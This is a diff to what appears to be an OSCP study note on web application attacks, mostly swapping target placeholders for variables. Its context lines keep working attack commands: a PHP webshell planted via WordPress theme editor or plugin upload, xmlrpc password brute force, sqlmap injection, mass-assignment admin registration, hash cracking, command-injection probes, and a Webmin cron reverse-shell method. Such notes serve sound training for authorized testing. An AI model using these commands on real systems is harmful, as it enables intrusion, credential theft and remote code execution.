@@ -34,7 +34,7 @@ Decoder tab → paste → Decode as → Base64 (repeat per layer) → Decode as 
 set PROXIES HTTP:127.0.0.1:8080
 
 # curl
-curl http://<target> --proxy http://127.0.0.1:8080
+curl http://$BoxIP --proxy http://127.0.0.1:8080
 
 # Environment variable (affects most HTTP tools)
 export HTTP_PROXY="http://127.0.0.1:8080"
@@ -48,7 +48,7 @@ unset HTTP_PROXY    # clean up after
 
 ```bash
 # Add a static hosts entry first if the target needs a stable internal hostname
-echo "<target-ip> <hostname>" | sudo tee -a /etc/hosts
+echo "$BoxIP <hostname>" | sudo tee -a /etc/hosts
 ```
 
 > **Gotcha:** if Firefox's proxy is still pointed at Burp and Burp itself gets closed, Firefox stops working entirely until Burp's restarted or the proxy setting is reverted.
@@ -111,7 +111,7 @@ See [[08. Introduction to Web Application Attacks|Introduction to Web Applicatio
 
 ```bash
 # Delivery via a header instead of a form field, e.g. testing User-Agent for stored XSS
-curl -i http://<target> --user-agent "<script>alert(1)</script>" --proxy 127.0.0.1:8080
+curl -i http://$BoxIP --user-agent "<script>alert(1)</script>" --proxy 127.0.0.1:8080
 ```
 
 **XSS type quick reference:**
@@ -227,21 +227,21 @@ See [[08. Introduction to Web Application Attacks#8.4.3. Identifying XSS Vulnera
 
 ```bash
 # Brute force versioned API paths with a pattern file (containing {GOBUSTER}/v1, {GOBUSTER}/v2, etc)
-gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern
+gobuster dir -u http://$BoxIP:$Port -w /usr/share/wordlists/dirb/big.txt -p pattern
 
 # Probe a discovered endpoint directly
-curl -i http://<target>:<port>/<endpoint>
+curl -i http://$BoxIP:$Port/<endpoint>
 
 # Try a different HTTP method if you get 405 instead of 404 (path exists, wrong verb)
-curl -i -X PUT http://<target>:<port>/<endpoint>
+curl -i -X PUT http://$BoxIP:$Port/<endpoint>
 
 # Register with an undocumented/guessed privileged field (mass assignment)
 curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
   -H 'Content-Type: application/json' \
-  http://<target>:<port>/users/v1/register
+  http://$BoxIP:$Port/users/v1/register
 
 # Use a returned auth token (JWT, etc) against a protected endpoint
-curl -X 'PUT' 'http://<target>:<port>/<endpoint>' \
+curl -X 'PUT' 'http://$BoxIP:$Port/<endpoint>' \
   -H 'Content-Type: application/json' \
   -H 'Authorization: OAuth <token>' \
   -d '{"key": "value"}'
@@ -260,35 +260,35 @@ See [[08. Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing
 
 ```bash
 # WPScan — full enumeration (plugins, themes, users, upload dir, timthumbs)
-wpscan --url http://<target> --enumerate
+wpscan --url http://$BoxIP --enumerate
 
 # User enumeration only
-wpscan --url http://<target> --enumerate u
+wpscan --url http://$BoxIP --enumerate u
 
 # Brute force via xmlrpc (faster + often less filtered than wp-login)
-wpscan --password-attack xmlrpc -t 20 -U <user> -P /usr/share/wordlists/rockyou.txt --url http://<target>
+wpscan --password-attack xmlrpc -t 20 -U $Username -P /usr/share/wordlists/rockyou.txt --url http://$BoxIP
 
 # Directory listing on /wp-content/uploads/ (flagged by WPScan when enabled)
-# Browse: http://<target>/wp-content/uploads/YYYY/MM/ — files left publicly accessible
-curl http://<target>/wp-content/uploads/
+# Browse: http://$BoxIP/wp-content/uploads/YYYY/MM/ — files left publicly accessible
+curl http://$BoxIP/wp-content/uploads/
 
 # Fingerprint installed plugin version (no auth needed)
-curl http://<target>/wp-content/plugins/<plugin-name>/readme.txt
+curl http://$BoxIP/wp-content/plugins/<plugin-name>/readme.txt
 # Look for the "Stable tag:" line, then search for a matching public exploit
 searchsploit <plugin name>
 
 # Unauthenticated SQLi is common via admin-ajax.php, every plugin's AJAX actions route
 # through this one shared endpoint regardless of login state
-sqlmap -u "http://<target>/wp-admin/admin-ajax.php?action=<plugin_action>&<param>=1" -p <param> --batch --ignore-code=404
+sqlmap -u "http://$BoxIP/wp-admin/admin-ajax.php?action=<plugin_action>&<param>=1" -p <param> --batch --ignore-code=404
 
 # Crack a dumped wp_users phpass hash ($P$... or $H$...) with John
-echo 'admin:$P$<hash>' > wp_hash.txt
+echo 'admin:$P$$AdminHash' > wp_hash.txt
 john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wp_hash.txt
 
 # Admin-to-RCE option 1: Appearance > Theme File Editor, paste into any template (e.g. 404.php)
 <?php system($_GET['cmd']); ?>
 # then trigger it by requesting a nonexistent URL (forces 404.php to render)
-curl "http://<target>/nonexistent-page?cmd=id"
+curl "http://$BoxIP/nonexistent-page?cmd=id"
 
 # Admin-to-RCE option 2 (use if option 1 fails with "Unable to communicate back with
 # site, so the PHP change was reverted", WP's fatal-error-protection loopback check
@@ -303,7 +303,7 @@ system($_GET['cmd']);
 EOF
 cd /tmp && zip -r shell.zip shell
 # Then in the dashboard: Plugins > Add New > Upload Plugin > shell.zip > Install > Activate
-curl "http://<target>/?cmd=id"
+curl "http://$BoxIP/?cmd=id"
 ```
 *The plugin-upload webshell has no hook, so it runs on every single page load once activated, not just a specific route. Same `cmd`-parameter pattern as every other webshell in this vault, just delivered via plugin activation instead of file upload/SQLi/theme edit.*
 
@@ -316,7 +316,7 @@ See [[10. SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (Perfect Surv
 ## Webmin
 
 ```
-https://<target>:10000
+https://$BoxIP:10000
 ```
 *A full system administration panel. Any valid login (root or otherwise) with sufficient rights is functionally the same as remote code execution as whatever user owns the Webmin process, usually root: **System → Scheduled Cron Jobs → Create a new scheduled cron job**, set "Execute as user" to `root`, put a reverse shell one-liner in Command, set it to run within the next minute, save. Start a listener before it fires.*
 
@@ -324,7 +324,7 @@ https://<target>:10000
 
 *If the target only supports old TLS (`TLSv1.0`/`SSLv3`, common on old CentOS-era boxes), force it explicitly rather than fighting a browser's default refusal:*
 ```bash
-curl -k --tlsv1.0 "https://<target>:10000" 2>/dev/null
+curl -k --tlsv1.0 "https://$BoxIP:10000" 2>/dev/null
 ```
 
 See [[Beep|Beep box writeup]] for the full worked chain (credential reuse into Webmin, cron job to root).
@@ -337,15 +337,15 @@ See [[Beep|Beep box writeup]] for the full worked chain (credential reuse into W
 
 ```bash
 # Replace a command-shaped parameter value entirely with a harmless command
-curl -X POST --data 'param=<harmless-command>' http://<target>/<endpoint>
+curl -X POST --data 'param=<harmless-command>' http://$BoxIP/<endpoint>
 
 # Chain a second command (URL-encoded ; or &&, CMD also accepts single &)
-curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://<target>/<endpoint>
+curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://$BoxIP/<endpoint>
 
 # No command-shaped hint at all? Work through systematically:
-curl -X POST --data 'param=1%2B1' http://<target>/<endpoint>       # eval()? expect "2"
-curl -X POST --data 'param={{7*7}}' http://<target>/<endpoint>     # Jinja2 SSTI? expect "49"
-curl -X POST --data-urlencode 'param=`id`' http://<target>/<endpoint>   # plain OS injection
+curl -X POST --data 'param=1%2B1' http://$BoxIP/<endpoint>       # eval()? expect "2"
+curl -X POST --data 'param={{7*7}}' http://$BoxIP/<endpoint>     # Jinja2 SSTI? expect "49"
+curl -X POST --data-urlencode 'param=`id`' http://$BoxIP/<endpoint>   # plain OS injection
 
 # CMD vs PowerShell detection on Windows (credit: PetSerAl)
 # (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
@@ -494,7 +494,7 @@ for i in {1..20}; do
     done
 done
 # Usage: bash script.sh STMIP:STMPO
-# Then: ls -lAS <downloaded files> | head; cat flag_*.txt
+# Then: ls -lAS $BoxDir | head; cat flag_*.txt
 ```
 
 **Mass enumeration (GET-based, API path, JSON response):**
@@ -722,3 +722,14 @@ This area grows alongside the modules. The current follow-up is to add Drupal, J
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
